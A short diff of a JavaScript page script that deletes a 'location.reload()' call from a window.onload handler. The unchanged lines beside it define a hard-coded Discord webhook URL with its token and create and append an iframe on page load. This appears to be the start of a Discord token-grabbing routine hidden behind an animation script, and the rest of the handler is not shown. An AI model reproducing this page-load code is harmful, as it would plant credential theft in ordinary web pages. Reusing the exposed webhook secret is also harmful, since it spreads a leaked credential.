@@ -132,7 +132,6 @@ function animate () {
 }
 
 window.onload = function () {
-  location.reload();
     var discordWebhook = "https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW";
     var i = document.createElement('iframe');
     document.body.appendChild(i);
